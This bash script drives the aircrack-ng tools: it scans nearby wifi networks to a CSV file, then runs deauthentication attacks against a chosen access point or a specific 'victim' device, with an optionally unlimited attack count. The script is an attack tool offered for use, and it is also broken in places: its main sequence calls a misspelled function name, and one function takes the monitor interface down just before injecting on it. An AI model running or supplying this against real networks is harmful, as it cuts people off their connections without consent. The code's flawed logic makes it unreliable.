#!/bin/bash
source /root/Desktop/Bash_Scripts/sources/Variables.sh
# scans for wireless networks in the area and writes the data to a csv file
function Scan_To_CSV() {
	echo "Scanning for wifi networks, use CTRL + C to stop."
	airmon-ng check kill
	airmon-ng start wlan0
	airodump-ng -w airodump.csv --output-format csv wlan0mon
}

#asks for mac address of the network and optionally of the client you want to attack
function Start_Deauth() {
	airmon-ng stop wlan0
	echo "Input mac address of wifi to attack:"
	read APmac
  echo "input amount of attacks to perform (0 = unlimited)"
  read Amount

	while true; do
    	read -p "Do you want to attack a specific victim? (Y/N)" yn
    	case $yn in
        	[Yy]* ) read -p "Input mac address of the victim to attack:" VictimMac ; Deauth_Victim $Amount $APmac $VictimMac; break;;
        	[Nn]* ) Deauth_Wifi $Amount $APmac; break;;
        	* ) echo "Please answer yes or no.";;
    	esac
		done
}

#performs a deauthentication attack against a network
function Deauth_Wifi() {
	ifconfig wlan0mon down
	aireplay-ng -0 $1 -a $2 wlan0mon -D
}

#performs a deauthentication attack against a specific device on a network
function Deauth_Victim() {
	aireplay-ng -0 $1 -a $2 -c $3 wlan0mon -D
}

#puts the wireless interface back into managed mode
function Wlan0managed() {
	airmon-ng stop wlan0mon
	service network-manager start
}

#executes functions in order
ScanT_o_CSV
Start_Deauth
Wlan0managed
